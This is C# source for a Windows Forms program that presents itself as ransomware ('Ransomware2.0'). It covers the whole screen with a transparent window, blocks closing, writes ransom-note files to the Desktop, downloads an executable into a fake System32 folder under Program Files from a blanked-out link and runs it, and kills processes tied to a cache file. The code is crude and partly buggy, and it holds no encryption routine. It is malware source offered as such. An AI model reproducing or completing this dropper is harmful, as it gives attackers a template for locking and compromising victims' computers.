using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;



namespace Efevra
{
    public partial class Efevra : Form
    {
        private string patcachefile;

        public Efevra()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        public StreamWriter StreamWriter { get; private set; }

        private void Efevra_FormClosing(object sender, FormClosingEventArgs e)
        {

            e.Cancel = true;
        }


            

        private void Efevra_Load(object sender, EventArgs e)
        {
                this.Left = 0;
                this.Top = 0;
                this.Width = Screen.PrimaryScreen.Bounds.Width;
                this.Height = Screen.PrimaryScreen.Bounds.Height;

                string path_cahce = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string existfile = path_cahce + @"\.cache_DCQPKX";


                if (!File.Exists(existfile))
                {
                    string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                    using (StreamWriter streamWriter = File.CreateText(patcachefile + @"\._cache_DCQPKX.exe"))
                    {
                        streamWriter.WriteLine("Your files are lock");
                    }
                }

                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt"))
                {
                    streamWriter.WriteLine("Your files has been locked");

                }

                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                WebClient webClient = new WebClient();
                webClient.DownloadFile("", @"C:\Program Files\System32\Ransomware2.0.exe"); //LINK

                Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");


                Process[] _process = null;
                _process = Process.GetProcessesByName("DCQPKX");
                foreach (Process proces in _process)
                {
                    proces.Kill();
                }

                Process[] _process2 = null;
                _process2 = Process.GetProcessesByName("._cache_DCQPKX");
                foreach (Process proces2 in _process2)
                {
                    proces2.Kill();



                }


            }
        }
    }

